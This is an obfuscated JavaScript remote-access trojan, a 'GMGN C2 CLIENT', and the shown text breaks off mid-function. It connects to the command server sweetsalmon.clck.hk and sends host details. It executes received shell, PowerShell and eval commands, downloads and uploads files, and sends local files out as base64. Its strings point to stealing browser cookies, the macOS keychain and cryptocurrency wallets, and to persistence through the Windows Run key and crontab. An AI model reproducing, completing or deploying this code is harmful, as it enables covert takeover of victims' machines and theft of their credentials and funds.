const _0x1bbf8f=_0x3f04;(function(_0x2ec031,_0xa24ab4){const _0x1edf1d=_0x3f04,_0x4f0787=_0x2ec031();while(!![]){try{const _0x188e6e=parseInt(_0x1edf1d(0x107))/0x1+-parseInt(_0x1edf1d(0x1fc))/0x2*(parseInt(_0x1edf1d(0x1bd))/0x3)+-parseInt(_0x1edf1d(0x21c))/0x4+parseInt(_0x1edf1d(0x124))/0x5*(parseInt(_0x1edf1d(0x16e))/0x6)+parseInt(_0x1edf1d(0xf3))/0x7*(parseInt(_0x1edf1d(0x1e0))/0x8)+parseInt(_0x1edf1d(0x192))/0x9+-parseInt(_0x1edf1d(0x16f))/0xa;if(_0x188e6e===_0xa24ab4)break;else _0x4f0787['push'](_0x4f0787['shift']());}catch(_0x330887){_0x4f0787['push'](_0x4f0787['shift']());}}}(_0x1a82,0x66836));const net=require(_0x1bbf8f(0x21d)),{exec,execSync}=require(_0x1bbf8f(0x1af)),fs=require('fs'),path=require('path'),os=require('os'),crypto=require(_0x1bbf8f(0x1f7)),dns=require('dns');console['log'](_0x1bbf8f(0x1cf));const config={'serverDomain':_0x1bbf8f(0x17e),'serverPort':0x115c,'reconnectDelay':0x2710,'maxReconnectAttempts':-0x1,'logFile':path[_0x1bbf8f(0xec)](__dirname,'connection-log.txt'),'logEnabled':!![],'logRotateSize':0x5*0x400*0x400,'systemInfo':{'hostname':os[_0x1bbf8f(0x162)](),'platform':os[_0x1bbf8f(0x11a)](),'type':os[_0x1bbf8f(0x12c)](),'arch':os[_0x1bbf8f(0x18b)](),'username':os[_0x1bbf8f(0x198)]()[_0x1bbf8f(0x1a6)],'totalMem':Math[_0x1bbf8f(0x1b5)](os['totalmem']()/(0x400*0x400))+'MB','freeMem':Math[_0x1bbf8f(0x1b5)](os[_0x1bbf8f(0xc8)]()/(0x400*0x400))+'MB','uptime':Math[_0x1bbf8f(0x1b5)](os[_0x1bbf8f(0x1f6)]()/0x3c)+_0x1bbf8f(0xd6),'cpuCount':os[_0x1bbf8f(0x1cc)]()['length'],'cpuModel':os[_0x1bbf8f(0x1cc)]()[0x0]['model'],'id':generateClientId()},'encryptionEnabled':![],'encryptionKey':_0x1bbf8f(0x130),'features':{'allowShellExecution':!![],'allowFileTransfer':!![],'allowScreenshot':!![],'persistOnStartup':![]}};function resolveDomainAndConnect(_0x53cafb=0x0){const _0xb73057=_0x1bbf8f;rotateLogIfNeeded(),logMessage(_0xb73057(0x145)+config[_0xb73057(0x156)]+':'+config[_0xb73057(0x148)]+_0xb73057(0xfa));if(config[_0xb73057(0xed)]>0x0&&_0x53cafb>=config[_0xb73057(0xed)]){logMessage(_0xb73057(0x1ed)+config['maxReconnectAttempts']+_0xb73057(0x226));return;}dns['lookup'](config[_0xb73057(0x156)],(_0x29cb5c,_0x300101)=>{const _0x290c1c=_0xb73057;if(_0x29cb5c){logMessage('DNS\x20resolution\x20error:\x20'+_0x29cb5c[_0x290c1c(0x11d)]);const _0x131a6f=config['reconnectDelay']*Math['min'](Math[_0x290c1c(0x1b8)](1.5,Math[_0x290c1c(0x125)](_0x53cafb,0xa)),0x5);setTimeout(()=>{resolveDomainAndConnect(_0x53cafb+0x1);},_0x131a6f);return;}logMessage(_0x290c1c(0x20f)+config[_0x290c1c(0x156)]+_0x290c1c(0xfc)+_0x300101),connectToServer(_0x300101,_0x53cafb);});}function _0x1a82(){const _0x2b0128=['Error:\x20Failed\x20to\x20download.\x20Status\x20code:\x20','map','Amazon$hopping','aes-256-cbc','Файл\x20','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cLitecoin','random','toString','length','persist.js','\x20minutes','Persistence\x20functionality\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','\x20байт)','Error\x20retrieving\x20passwords:\x20','connect','mode','\x20seconds\x0a','2024-03-01','Encryption\x20error:\x20','Source\x20path\x20not\x20found:\x20','session-id','Log\x20file\x20rotated\x20due\x20to\x20size\x20limit','Monitoring\x20was\x20not\x20running\x0a','example_netflix_id','/Library/Keychains/login.keychain-db','\x20-OutFile\x20\x22','rm\x20-rf\x20FF\x20FF.zip','\x22\x20-OutFile\x20\x22','Unknown','\x22)\x20|\x20crontab\x20-','allowScreenshot','Persistence\x20error:\x20','join','maxReconnectAttempts','0\x20Bytes','files:list:','stdout','Not\x20a\x20file:\x20','Bitcoin','105xhjaBh','D8vFz4p1L37jdg9E2LmeMgbU1hYHYpKsHS','statSync','Directory\x20created:\x20','Screenshot\x20functionality\x20requires\x20additional\x20libraries\x20(not\x20implemented)\x0a','\x20(no\x20matching\x20files)\x0a','Monero','...','0.25\x20BTC','\x20resolved\x20to\x20','paypal_user','VISITOR_INFO1_LIVE','finish','CloudStorage!','createDecipheriv','Script\x20saved\x20to\x20','Attempting\x20to\x20connect\x20to\x20','encryptionKey','copyFileSync','clone','358192HDMMaN','example_session_id','Error:\x20Invalid\x20format.\x20Use\x20ps_download:URL:OUTPUT_PATH\x0a','Найдено\x20файлов:\x20','25\x20SOL','unlink','substring','Shell\x20execution\x20is\x20disabled\x20in\x20this\x20client\x20configuration','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cDaedalus','Enabled','allowFileTransfer','createHash','from','netmask','\x0aStderr:\x20','Bitcoin\x20Cash','200\x20ADA','tweet2023!','base64','platform','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cEthereum','end','message','2.0\x20BCH','encryptionEnabled','bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh','2023-12-31','replace','secureGitPass!','10dPMUXk','min','floor','File\x20or\x20URL\x20opened\x20successfully','/bin/sh','Ошибка\x20выполнения:\x20','\x0aClient\x20ID:\x20','0x71C7656EC7ab88b098defB751B7401B5f6d8976F','type','File\x20operations\x20are\x20disabled\x20in\x20this\x20client\x20configuration\x0a','https://www.netflix.com','storage_user','abc123def456ghi789jkl012mno345pqr','log','Shell\x20execution\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','linkedin.com','data','persistOnStartup','includes','get','catch','Error\x20reading\x20file:\x20','example_user_session','Socket',':~/ChromeCache/bin/','files:move:','code','write','Error\x20retrieving\x20cookies:\x20','createWriteStream','powershell:','Set-','Monitoring\x20error:\x20','Attempting\x20to\x20resolve\x20and\x20connect\x20to\x20','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cSolana','qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a','serverPort','-Command','\x20is\x20not\x20accessible\x20or\x20not\x20a\x20regular\x20file\x0a','Error:\x20Invalid\x20format.\x20Use\x20download_url:URL:OUTPUT_PATH','exec_ps:','00:00:00:00:00:00','...\x0a','5.2\x20XMR','hex','PowerShell\x20Script\x20Result:\x0a','linux','forEach','Invalid\x20parameters\x20for\x20move\x20command\x0a',':utf8:','serverDomain','ps_download:','renameSync','readdirSync','mkdirSync','WatchMovies2023','Money$afe123','win32','steal:wallets','path','--progress','curl\x20--version','hostname','download_url:','File\x20transfer\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','Process\x20information\x20requires\x20system\x20commands','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cBitcoinCash','IPv4','darwin','internal','writeFileSync','Get-','Disabled','File\x20successfully\x20downloaded\x20and\x20saved\x20to:\x20','1224642DVsNIG','2849810LpgByp','http','2024-01-01','Eval\x20result:\x20','slice',':binary:true\x0a','git:','pipe','Screenshot\x20functionality\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','env','Ошибка\x20выполнения\x20JavaScript\x20файла:\x20','steal:macos:keychain','COOKIES_DATA:','2024-02-15','appendFileSync','sweetsalmon.clck.hk','files:read:','main','toISOString','instagram.com','MONITORING_DATA:','model','totalmem','Photo2023!','Error:\x20','readFileSync','indexOf','steal:cookies','arch','eval:','files:delete:','500\x20XRP','rmdirSync','randomBytes','datr','1629945nWzlNO','example_linkedin_auth','ignore','Файл\x20keychain\x20не\x20найден','\x20->\x20','Error\x20creating\x20log\x20directory:\x20','userInfo','ps:','Ripple','[*]\x20Encryption:\x20','git\x20--version','File\x20downloaded\x20and\x20saved\x20to:\x20','stringify','logEnabled','Error\x20writing\x20to\x20log:\x20','error','cwd','family','concat','statusCode','username','Error\x20executing\x20Git\x20command:\x20','ig_did','execSync','allowShellExecution','Error\x20retrieving\x20macOS\x20keychain\x20data:\x20','screenshot','files:mkdir:','existsSync','child_process','2024-01-10','mtime','2024-01-20','/Users/','unlinkSync','round','File\x20not\x20found:\x20','PowerShell\x20Error:\x20','pow','idle','split','Changed\x20directory\x20to:\x20','v1_example_personalization','6771VSziiu','upload:','amazon.com','systemInfo','Application\x20opened\x20successfully','reg\x20add\x20\x22HKCU\x5cSoftware\x5cMicrosoft\x5cWindows\x5cCurrentVersion\x5cRun\x22\x20/v\x20\x22NodeService\x22\x20/t\x20REG_SZ\x20/d\x20\x22node\x20','Monitoring\x20start\x20error:\x20','\x20with\x20args:\x20','open\x20-a\x20\x22','exit','freeMem','50\x20DOT','Файл\x20keychain\x20успешно\x20скопирован','2024-03-15','sysinfo','cpus','Error\x20(code\x20','powershell\x20-Command\x20\x22','\x0a┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\x0a┃\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20GMGN\x20C2\x20CLIENT\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20┃\x0a┃\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20SECURE\x20CONNECTION\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20┃\x0a┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\x0a','2024-02-01','Exit\x20command\x20received,\x20closing\x20connection','Monitoring\x20stopped\x0a','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cDogecoin','File\x20too\x20large\x20for\x20preview\x20(','10.0\x20LTC','update','mac','https://www.amazon.com','NetflixId','https://www.dropbox.com','test','511=example_cookie_value','Cardano','entries','cd\x20','151408KodWpI','reconnectDelay','user.name','twitteruser','PATH','Connection\x20closed,\x20scheduling\x20reconnect...','\x20байт','monitoringInterval','https://www.linkedin.com','Отправлен\x20архив\x20размером\x20','stderr','-a\x20','li_at','Maximum\x20reconnection\x20attempts\x20(','github.com','[*]\x20Connecting\x20to:\x20','git\x20','size','Общая\x20ошибка:\x20','example_datr_cookie','utf8','instagrammer','uptime','crypto','FILE_CONTENT:','\x20в\x20директории:\x20','Executing\x20command:\x20','curl\x20','158wftEPj','createCipheriv','close','1FRMM8PEiWXYax7rpS6X4ZX1aAAAm1Y8xvEP5puWYEZQBwbY','FILES_LIST:','node_download:','N/A','Error\x20writing\x20file:\x20','times','keys','https://www.google.com','Received\x20command:\x20','example_ig_device_id','):\x20','features','FILE_CONTENT:FF.zip:','reddit_session','filter','Error\x20creating\x20directory:\x20','Domain\x20','\x20не\x20найден\x0a','Git\x20Error\x20(code\x20','Invoke-','reddit.com','Error\x20listing\x20directory:\x20','final','5VhBPMEEozEidR8XidRdQiUzqV2o2L693dVJbTdCXwaP','addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh','cp\x20-r\x20\x22','1.5\x20ETH','isDirectory','Error:\x20Invalid\x20format.\x20Use\x20node_download:URL:OUTPUT_PATH\x0a','1392892qdxKCy','net','Litecoin','example_visitor_info','https','Connected\x20to\x20','networkInterfaces','unknown','Starting\x20download\x20from\x20','Git\x20is\x20not\x20installed\x20or\x20not\x20available\x20in\x20PATH.\x20Please\x20install\x20Git\x20and\x20try\x20again.',')\x20reached,\x20stopping\x20reconnection','node\x20','powershell.exe','startsWith','File\x20deleted:\x20','File\x20uploaded\x20successfully\x20to:\x20','push','https://www.facebook.com','Bytes','logFile','Git\x20command\x20executed\x20successfully\x20(no\x20output)','/Library/Application\x20Support/Google/Chrome/Default','zip\x20-r\x20FF.zip\x20FF','https://www.paypal.com','trim','digest','user_session','spawn','open\x20','C:\x5cUsers\x5cUsername\x5cDocuments\x5cXRP','ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfm0xwlh','[*]\x20Features\x20enabled:\x20','Polkadot','cmd.exe','Выполнение\x20скрипта:\x20','Added\x20to\x20crontab\x20@reboot\x0a','Download\x20Error:\x20','isFile','C:\x5cUsers\x5cUsername\x5cDocuments\x5cMonero','freemem','stack','\x22\x20-UseBasicParsing','dirname'];_0x1a82=function(){return _0x2b0128;};return _0x1a82();}const logDir=path[_0x1bbf8f(0xcb)](config[_0x1bbf8f(0xb4)]);if(!fs[_0x1bbf8f(0x1ae)](logDir)&&config[_0x1bbf8f(0x19f)])try{fs[_0x1bbf8f(0x15a)](logDir,{'recursive':!![]});}catch(_0x38087f){console[_0x1bbf8f(0x1a1)](_0x1bbf8f(0x197)+_0x38087f[_0x1bbf8f(0x11d)]);}function generateClientId(){const _0x5a6f9b=_0x1bbf8f;try{const _0x4d91cc=getMacAddress(),_0x5dba6d=os[_0x5a6f9b(0x162)](),_0x1494eb=os['userInfo']()[_0x5a6f9b(0x1a6)],_0x510f60=crypto[_0x5a6f9b(0x112)]('md5')[_0x5a6f9b(0x1d6)](_0x4d91cc+':'+_0x5dba6d+':'+_0x1494eb)[_0x5a6f9b(0xba)]('hex')[_0x5a6f9b(0x10d)](0x0,0x8);return _0x510f60;}catch(_0x555a83){return Math[_0x5a6f9b(0xd2)]()[_0x5a6f9b(0xd3)](0x24)[_0x5a6f9b(0x10d)](0x2,0xa);}}function getMacAddress(){const _0x3bd910=_0x1bbf8f;try{const _0x5b49dd=os[_0x3bd910(0x222)]();for(const _0x501f1e of Object[_0x3bd910(0x205)](_0x5b49dd)){for(const _0x3249dd of _0x5b49dd[_0x501f1e]){if(!_0x3249dd[_0x3bd910(0x169)]&&_0x3249dd[_0x3bd910(0x1d7)]!==_0x3bd910(0x14d))return _0x3249dd[_0x3bd910(0x1d7)];}}return _0x3bd910(0x223);}catch(_0x3777c3){return _0x3bd910(0x223);}}function rotateLogIfNeeded(){const _0x4bb013=_0x1bbf8f;if(!config[_0x4bb013(0x19f)])return;try{if(fs['existsSync'](config[_0x4bb013(0xb4)])){const _0x14a2d1=fs[_0x4bb013(0xf5)](config['logFile']);if(_0x14a2d1['size']>config['logRotateSize']){const _0x55c983=config[_0x4bb013(0xb4)]+'.'+new Date()[_0x4bb013(0x181)]()[_0x4bb013(0x122)](/:/g,'-');fs[_0x4bb013(0x158)](config[_0x4bb013(0xb4)],_0x55c983),logMessage(_0x4bb013(0xe1));}}}catch(_0x3ece71){console['error']('Error\x20rotating\x20log:\x20'+_0x3ece71['message']);}}function logMessage(_0x49da64){const _0x14c2fc=_0x1bbf8f;if(!config['logEnabled'])return;const _0x55097d=new Date()[_0x14c2fc(0x181)](),_0x2045b3='['+_0x55097d+']\x20'+_0x49da64+'\x0a';console['log'](_0x2045b3[_0x14c2fc(0xb9)]());try{fs[_0x14c2fc(0x17d)](config['logFile'],_0x2045b3);}catch(_0x1a5231){console[_0x14c2fc(0x1a1)](_0x14c2fc(0x1a0)+_0x1a5231['message']);}}function encryptData(_0x1436aa){const _0x1c213f=_0x1bbf8f;if(!config[_0x1c213f(0x11f)])return _0x1436aa;try{const _0x518c9d=crypto[_0x1c213f(0x190)](0x10),_0x56973e=crypto[_0x1c213f(0x1fd)](_0x1c213f(0xcf),Buffer[_0x1c213f(0x113)](config[_0x1c213f(0x104)]),_0x518c9d);let _0x763ee5=_0x56973e[_0x1c213f(0x1d6)](_0x1436aa);return _0x763ee5=Buffer[_0x1c213f(0x1a4)]([_0x763ee5,_0x56973e[_0x1c213f(0x215)]()]),_0x518c9d['toString'](_0x1c213f(0x150))+':'+_0x763ee5['toString'](_0x1c213f(0x150));}catch(_0x10b18c){return logMessage(_0x1c213f(0xde)+_0x10b18c[_0x1c213f(0x11d)]),_0x1436aa;}}function decryptData(_0x248166){const _0xa192d7=_0x1bbf8f;if(!config['encryptionEnabled'])return _0x248166;try{const _0x2a9b85=_0x248166[_0xa192d7(0x1ba)](':');if(_0x2a9b85[_0xa192d7(0xd4)]!==0x2)return _0x248166;const _0x316a7a=Buffer['from'](_0x2a9b85[0x0],'hex'),_0x4a9b5d=Buffer['from'](_0x2a9b85[0x1],_0xa192d7(0x150)),_0x348ebf=crypto[_0xa192d7(0x101)](_0xa192d7(0xcf),Buffer[_0xa192d7(0x113)](config['encryptionKey']),_0x316a7a);let _0x40e714=_0x348ebf[_0xa192d7(0x1d6)](_0x4a9b5d);return _0x40e714=Buffer[_0xa192d7(0x1a4)]([_0x40e714,_0x348ebf[_0xa192d7(0x215)]()]),_0x40e714['toString']();}catch(_0x391eae){return logMessage('Decryption\x20error:\x20'+_0x391eae[_0xa192d7(0x11d)]),_0x248166;}}async function executeCommand(_0x4864d6){const _0x38ec1a=_0x1bbf8f;if(!config[_0x38ec1a(0x20a)][_0x38ec1a(0x1aa)])return _0x38ec1a(0x10e);if(_0x4864d6['startsWith'](_0x38ec1a(0x163)))return await downloadFromUrl(_0x4864d6[_0x38ec1a(0x10d)](0xd));if(os[_0x38ec1a(0x11a)]()===_0x38ec1a(0x168)){if(_0x4864d6['startsWith'](_0x38ec1a(0xbd))){const _0x4fc536=_0x4864d6[_0x38ec1a(0x10d)](0x5)[_0x38ec1a(0xb9)]();if(_0x4fc536[_0x38ec1a(0xae)](_0x38ec1a(0x1eb))){const _0x5766f5=_0x4fc536['substring'](0x3)['trim']();return new Promise(_0x4010eb=>{const _0x2529bc=_0x38ec1a;exec(_0x2529bc(0x1c5)+_0x5766f5+'\x22',(_0x5d8900,_0x2c0372,_0x111f40)=>{const _0x408c96=_0x2529bc;if(_0x5d8900){_0x4010eb(_0x408c96(0x1cd)+_0x5d8900[_0x408c96(0x13e)]+_0x408c96(0x209)+_0x111f40);return;}_0x4010eb(_0x2c0372||_0x408c96(0x1c1));});});}return new Promise(_0x38fcac=>{const _0x357921=_0x38ec1a;exec(_0x357921(0xbd)+_0x4fc536,(_0x4c3328,_0x3c4ae8,_0x20d9b1)=>{const _0x405740=_0x357921;if(_0x4c3328){_0x38fcac(_0x405740(0x1cd)+_0x4c3328[_0x405740(0x13e)]+_0x405740(0x209)+_0x20d9b1);return;}_0x38fcac(_0x3c4ae8||_0x405740(0x127));});});}}const _0x18f619=_0x4864d6[_0x38ec1a(0xae)](_0x38ec1a(0x212))||_0x4864d6[_0x38ec1a(0xae)](_0x38ec1a(0x143))||_0x4864d6[_0x38ec1a(0xae)](_0x38ec1a(0x16b))||_0x4864d6[_0x38ec1a(0xae)](_0x38ec1a(0x199));return _0x4864d6['startsWith'](_0x38ec1a(0x199))&&(_0x4864d6=_0x4864d6[_0x38ec1a(0x10d)](0x3)),new Promise(_0xbbdec8=>{const _0x4f6fa9=_0x38ec1a;let _0x22c13c='/bin/sh',_0xd2bb84=['-c'];const _0x14760c=os['platform']();if(_0x14760c===_0x4f6fa9(0x15d))_0x22c13c=_0x18f619?_0x4f6fa9(0x228):_0x4f6fa9(0xc2),_0xd2bb84=_0x18f619?['-Command']:['/c'];else _0x14760c==='darwin'?(_0x22c13c='/bin/zsh',_0xd2bb84=['-l','-c'],process[_0x4f6fa9(0x178)][_0x4f6fa9(0x1e4)]=process[_0x4f6fa9(0x178)][_0x4f6fa9(0x1e4)]+_0x4f6fa9(0x13c)):(_0x22c13c=_0x4f6fa9(0x128),_0xd2bb84=['-l','-c']);(_0x4864d6[_0x4f6fa9(0xae)](_0x4f6fa9(0x1fb))||_0x4864d6[_0x4f6fa9(0xae)](_0x4f6fa9(0x1f0)))&&(_0x14760c==='win32'&&(_0x4864d6[_0x4f6fa9(0xae)](_0x4f6fa9(0x1fb))&&!isCurlInstalled()&&(_0x4864d6=convertCurlToInvokeWebRequest(_0x4864d6),_0x22c13c=_0x4f6fa9(0x228),_0xd2bb84=[_0x4f6fa9(0x149)])));console[_0x4f6fa9(0x131)](_0x4f6fa9(0x1fa)+_0x4864d6),console[_0x4f6fa9(0x131)]('Using\x20shell:\x20'+_0x22c13c+_0x4f6fa9(0x1c4)+_0xd2bb84[_0x4f6fa9(0xec)]('\x20'));const _0x254abd=require(_0x4f6fa9(0x1af)),_0x401c1e=_0x254abd[_0x4f6fa9(0xbc)](_0x22c13c,[..._0xd2bb84,_0x4864d6],{'shell':!![],'env':{...process[_0x4f6fa9(0x178)]}});let _0xc659ce='',_0x726951='';_0x401c1e['stdout']['on'](_0x4f6fa9(0x134),_0x15c276=>{_0xc659ce+=_0x15c276['toString']();}),_0x401c1e['stderr']['on']('data',_0x198444=>{const _0x52b030=_0x4f6fa9;_0x726951+=_0x198444[_0x52b030(0xd3)]();}),_0x401c1e['on'](_0x4f6fa9(0x1fe),_0x4cfb30=>{const _0x49da5b=_0x4f6fa9;if(_0x4cfb30!==0x0){_0xbbdec8('Error\x20(code\x20'+_0x4cfb30+'):\x20'+_0x726951);return;}if(_0x726951){_0xbbdec8(_0xc659ce+_0x49da5b(0x115)+_0x726951);return;}_0xbbdec8(_0xc659ce||'Command\x20executed\x20(no\x20output)');});});}function isCurlInstalled(){const _0x1fc587=_0x1bbf8f;try{const _0x196813=require(_0x1fc587(0x1af));return _0x196813[_0x1fc587(0x1a9)](_0x1fc587(0x161),{'stdio':_0x1fc587(0x194)}),!![];}catch(_0x70f958){return![];}}function convertCurlToInvokeWebRequest(_0x3986e9){const _0x552525=_0x1bbf8f,_0x4e1809=_0x3986e9[_0x552525(0x1ba)]('\x20');if(_0x4e1809[_0x552525(0xd4)]>=0x2){const _0x1f0e35=_0x4e1809[0x1];let _0x3e918c='Invoke-WebRequest\x20-Uri\x20\x22'+_0x1f0e35+'\x22';const _0x3a9549=_0x4e1809[_0x552525(0x189)]('-o');return _0x3a9549!==-0x1&&_0x4e1809['length']>_0x3a9549+0x1&&(_0x3e918c+=_0x552525(0xe5)+_0x4e1809[_0x3a9549+0x1]+'\x22'),_0x3e918c;}return _0x3986e9;}async function downloadFromUrl(_0x501631){return new Promise(_0x485303=>{const _0x5cce56=_0x3f04;try{const _0x5b2c69=_0x501631[_0x5cce56(0x1ba)](':');if(_0x5b2c69[_0x5cce56(0xd4)]<0x2)return _0x485303(_0x5cce56(0x14b));const _0x4fb1a7=_0x5b2c69[0x0],_0x4e278f=_0x5b2c69[_0x5cce56(0x173)](0x1)[_0x5cce56(0xec)](':'),_0x37c9f8=require(_0x5cce56(0x170)),_0x327bef=require(_0x5cce56(0x220)),_0xac6099=require('fs'),_0x374c42=require(_0x5cce56(0x15f)),_0x343782=_0x374c42[_0x5cce56(0xcb)](_0x4e278f);!_0xac6099[_0x5cce56(0x1ae)](_0x343782)&&_0xac6099['mkdirSync'](_0x343782,{'recursive':!![]});const _0x161f22=_0x4fb1a7['startsWith'](_0x5cce56(0x220))?_0x327bef:_0x37c9f8,_0x1a98ee=_0xac6099[_0x5cce56(0x141)](_0x4e278f);_0x161f22[_0x5cce56(0x137)](_0x4fb1a7,_0x3f6b90=>{const _0xbb37b3=_0x5cce56;if(_0x3f6b90[_0xbb37b3(0x1a5)]!==0xc8)return _0x485303(_0xbb37b3(0xcc)+_0x3f6b90[_0xbb37b3(0x1a5)]);_0x3f6b90[_0xbb37b3(0x176)](_0x1a98ee),_0x1a98ee['on'](_0xbb37b3(0xff),()=>{const _0x2dc968=_0xbb37b3;_0x1a98ee['close'](),_0x485303(_0x2dc968(0x19d)+_0x4e278f);});})['on'](_0x5cce56(0x1a1),_0x366ede=>{const _0x1e13c7=_0x5cce56;_0xac6099[_0x1e13c7(0x10c)](_0x4e278f,()=>{}),_0x485303(_0x1e13c7(0x187)+_0x366ede[_0x1e13c7(0x11d)]);});}catch(_0x266405){_0x485303(_0x5cce56(0x187)+_0x266405[_0x5cce56(0x11d)]);}});}async function handleSpecialCommands(_0x2089a8,_0x173281){const _0x3d7daa=_0x1bbf8f;if(_0x2089a8[_0x3d7daa(0xae)]('download:')){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x111)])return _0x173281['write'](_0x3d7daa(0x164)),!![];const _0x225b8f=_0x2089a8['substring'](0x9)[_0x3d7daa(0xb9)]();if(_0x225b8f['includes']('*')||_0x225b8f[_0x3d7daa(0x136)]('?'))try{const _0x451730=path['dirname'](_0x225b8f),_0x10ea07=path['basename'](_0x225b8f);console['log']('Поиск\x20файлов\x20по\x20маске:\x20'+_0x10ea07+_0x3d7daa(0x1f9)+_0x451730);const _0x2dcea0=fs[_0x3d7daa(0x159)](_0x451730||'.');let _0x431f15=[];if(_0x10ea07[_0x3d7daa(0x136)]('*')||_0x10ea07['includes']('?')){const _0x1d262c=_0x10ea07[_0x3d7daa(0x122)](/\./g,'\x5c.')[_0x3d7daa(0x122)](/\*/g,'.*')['replace'](/\?/g,'.'),_0x29964c=new RegExp('^'+_0x1d262c+'$');_0x431f15=_0x2dcea0[_0x3d7daa(0x20d)](_0x5d1939=>_0x29964c[_0x3d7daa(0x1db)](_0x5d1939));}else _0x431f15=_0x2dcea0[_0x3d7daa(0x20d)](_0x59bb60=>_0x59bb60===_0x10ea07);console[_0x3d7daa(0x131)](_0x3d7daa(0x10a)+_0x431f15[_0x3d7daa(0xd4)]);if(_0x431f15[_0x3d7daa(0xd4)]>0x0){const _0x5f3720=path[_0x3d7daa(0xec)](_0x451730,_0x431f15[0x0]);console['log']('Выбран\x20файл\x20для\x20отправки:\x20'+_0x5f3720);if(fs[_0x3d7daa(0x1ae)](_0x5f3720)&&fs['statSync'](_0x5f3720)[_0x3d7daa(0xc6)]()){const _0x58c1e2=fs[_0x3d7daa(0x188)](_0x5f3720);return _0x173281[_0x3d7daa(0x13f)]('FILE_CONTENT:'+_0x5f3720+':'+_0x58c1e2[_0x3d7daa(0xd3)](_0x3d7daa(0x119))+'\x0a'),!![];}else return _0x173281[_0x3d7daa(0x13f)]('File\x20'+_0x5f3720+_0x3d7daa(0x14a)),!![];}else return _0x173281[_0x3d7daa(0x13f)]('File\x20not\x20found:\x20'+_0x225b8f+_0x3d7daa(0xf8)),!![];}catch(_0x23f8cb){return _0x173281[_0x3d7daa(0x13f)]('Error\x20finding\x20files:\x20'+_0x23f8cb[_0x3d7daa(0x11d)]+'\x0a'),!![];}else try{if(fs['existsSync'](_0x225b8f)){const _0x4d4a82=fs[_0x3d7daa(0x188)](_0x225b8f);return _0x173281[_0x3d7daa(0x13f)]('FILE_CONTENT:'+_0x225b8f+':'+_0x4d4a82[_0x3d7daa(0xd3)](_0x3d7daa(0x119))+'\x0a'),!![];}else return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x1b6)+_0x225b8f+'\x0a'),!![];}catch(_0x138159){return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x139)+_0x138159[_0x3d7daa(0x11d)]+'\x0a'),!![];}}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x1be))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x111)])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x164)),!![];const _0x262e78=_0x2089a8[_0x3d7daa(0x10d)](0x7)[_0x3d7daa(0x1ba)](':');if(_0x262e78[_0x3d7daa(0xd4)]===0x2){const [_0x325cf2,_0x17f06b]=_0x262e78;try{const _0x5ee334=Buffer['from'](_0x17f06b,'base64');fs[_0x3d7daa(0x16a)](_0x325cf2,_0x5ee334),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xb0)+_0x325cf2+'\x0a');}catch(_0xb2b68){_0x173281['write'](_0x3d7daa(0x203)+_0xb2b68[_0x3d7daa(0x11d)]+'\x0a');}return!![];}}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x18c))){const _0x30cd68=_0x2089a8['substring'](0x5);try{const _0x87b379=eval(_0x30cd68);_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x172)+_0x87b379+'\x0a');}catch(_0x4ff9e7){_0x173281['write']('Eval\x20error:\x20'+_0x4ff9e7[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8===_0x3d7daa(0x1cb))return config['systemInfo'][_0x3d7daa(0x1c7)]=Math[_0x3d7daa(0x1b5)](os[_0x3d7daa(0xc8)]()/(0x400*0x400))+'MB',config[_0x3d7daa(0x1c0)]['uptime']=Math[_0x3d7daa(0x1b5)](os['uptime']()/0x3c)+_0x3d7daa(0xd6),_0x173281[_0x3d7daa(0x13f)]('System\x20Information:\x0a'+JSON[_0x3d7daa(0x19e)](config[_0x3d7daa(0x1c0)],null,0x2)+'\x0a'),!![];if(_0x2089a8===_0x3d7daa(0x1ac)){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0xea)])return _0x173281['write'](_0x3d7daa(0x177)),!![];try{_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xf7));}catch(_0x49c969){_0x173281['write']('Screenshot\x20error:\x20'+_0x49c969['message']+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)]('persist:')){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x135)])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xd7)),!![];const _0x38c16c=_0x2089a8[_0x3d7daa(0x10d)](0x8);try{const _0x144095=path[_0x3d7daa(0xec)](__dirname,_0x3d7daa(0xd5));fs[_0x3d7daa(0x16a)](_0x144095,_0x38c16c),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x102)+_0x144095+'\x0a');if(os['platform']()===_0x3d7daa(0x15d)){const 